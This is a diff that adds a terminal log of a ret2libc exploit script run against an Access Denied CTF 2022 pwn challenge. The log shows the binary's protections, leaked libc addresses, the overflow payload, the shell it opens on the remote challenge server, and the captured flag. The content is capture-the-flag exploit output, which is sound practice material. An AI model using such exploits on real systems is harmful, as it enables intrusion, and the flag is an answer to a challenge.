@@ -1,0 +1,33 @@
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc$ python solve.py r
+[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc/ret2libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 107.178.209.165 on port 1337: Done
+[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7fbbb687d970
+libc_base   = 0x7fbbb67fd000
+system_addr = 0x7fbbb684c420
+binsh_addr  = 0x7fbbb69b0d88
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD\x12@
+$ id
+/bin/sh: 1: id: not found
+$ ls -l
+total 44
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 bin
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 dev
+-rwxr----- 1 0 1000    56 Jun 11 05:49 flag.txt
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib32
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib64
+-rwxr-x--- 1 0 1000 16816 Jun 11 05:50 ret2libc
+$ cat flag.txt
+accessdenied{ret2l1bc_15_r34lly_4m4z1ng_3xpl0_75723a21}
